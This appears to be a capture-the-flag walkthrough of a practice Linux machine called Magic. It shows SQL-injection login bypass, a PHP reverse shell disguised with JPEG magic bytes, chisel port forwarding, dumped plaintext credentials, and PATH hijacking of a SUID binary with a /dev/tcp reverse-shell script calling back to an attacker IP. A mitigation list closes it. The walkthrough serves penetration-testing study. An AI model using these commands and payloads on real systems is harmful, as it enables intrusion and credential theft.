## Introduction

In this walkthrough, we exploit **Magic**, an easy-difficulty Linux machine hosting a **custom web application**. The initial attack vector is a **SQL injection** vulnerability in the login form, which allows us to **bypass authentication** and access the application's upload functionality.

The file upload feature contains a **weak whitelist check**, which is bypassed to upload a **PHP web shell**, granting command execution on the target. During post-exploitation enumeration, the **MySQL database** is found to store **plaintext user credentials**, which are reused to gain access to another user account.

Privilege escalation is achieved by exploiting a **path hijacking vulnerability** in combination with a **misconfigured SUID binary**, leading to **root access** and full system compromise.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.29 ((Ubuntu))

```powershell
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php -b 403,404
```

![image.png](image%202.png)

In the login page I tried `admin:admin`, `admin:password` but no result, then I tried SQL injection

```powershell
' or 1=1 limit 1 -- -
```

and got access to upload functionality.

![image.png](image%203.png)

let’s try to append jpg magic bytes to PHP reverse shell and upload it as I have done in another Linux machine Networked.

```powershell
echo 'FF D8 FF E0' | xxd -p -r > mime_shell.php
cat shell.php >> mime_shell.php
```

I used Ivan Sincek PHP reverse shell.

Now we have a shell let’s turn it to tty using:

```powershell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I found `db.php5` file in web directories and there are credentials for MySQL instance.

## Lateral Movement

`mysql` client is not installed on the target machine that’s why I am gonna perform port forwarding and access it from attack machine.

[Port Forwarding with Chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)

```powershell
./chisel server --socks5 --port 51234
./chisel client 10.10.10.185:51234 127.0.0.1:3306:127.0.0.1:3306
```

```powershell
mysql -u theseus -p  -P 3306 --ssl=0
```

```sql
show databases;
use Magic;
```

![image.png](image%205.png)

![image.png](image%206.png)

```sql
show tables;
show columns from login;
```

![image.png](image%207.png)

```sql
select * from login;
```

![image.png](image%208.png)

I changed user to theseus using that password.

## Credentials

```powershell
theseus : iamkingtheseus
admin : Th3s3usW4sK1ng
```

## Privilege Escalation

Let’s add authorized_keys file to ensure persistance as `ssh` supports only key authentication.

```sql
ssh-keygen -t rsa
```

- **VERY important:**
    - `.ssh` must be `700`
    - `authorized_keys` must be `600`
    - Owned by `theseus`
    
    Otherwise SSH **refuses** to use them.
    

```sql
chmod 600 authorized_keys
chmod 700 .ssh
chmod 600 id_rsa_private
```

```sql
ssh -i id_rsa theseus@$IP
```

Now we have stable shell and persistent access:

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo 
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    

Let’s run `linpeas.sh` binary.

There is one non-default binary called `sysinfo` we can try to abuse it:

Whenever you see non-default SUID binary, and you cannot exploit it using GTFOBins, use command:

```bash
strace -v -f -e execve <binary> 2>&1 | grep exec
```

To see if the binary inherits user PATH variable, this is generally true but in some cases a binary or script can also **modify the `PATH` internally.**

![image.png](image%2010.png)

Compare this with our user `PATH`:

```bash
echo $PATH
env
```

![image.png](image%2011.png)

We can see that environment variables are same.

Now let’s if we can exploit this binary by abusing `PATH`, we are gonna look for services or binaries run by this binary for that I am gonna use `strings`:

![image.png](image%2012.png)

We can see it uses several binaries without their absolute path, that means we can add our directory where we are gonna put malicious binary of the same name as executed ones, then append that directory to `PATH` environment variable and export it. This way when the binary is run it will first search for executed binaries (`cat`, `fdisk`, `free`, `lshw`) in our directory.

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.27/1234 0>&1'
```

I created a new `fdisk` binary with above content and put it inside of `tmp` directory.

Then appended `/tmp` directory to `PATH` and exported it.

```bash
export PATH=/tmp:$PATH
```

Now let’s see `PATH` and verify if it is changed:

![image.png](image%2013.png)

As you see they are all changed.

Let’s now execute the script and wait for connection.

Now we are root!

## Mitigation

- Sanitize and use **parameterized queries** to prevent SQL injection.
- Implement **strict server-side file validation**, including MIME type checks, file extension filtering, and content scanning.
- Avoid storing **plaintext credentials** in databases; use strong, salted password hashing mechanisms.
- Regularly audit and sanitize **environment variables and PATH** used by privileged binaries.
- Restrict and monitor the use of **SUID binaries**; remove the SUID bit from non-essential executables.
- Apply **principle of least privilege** and monitor for suspicious privilege escalation attempts.
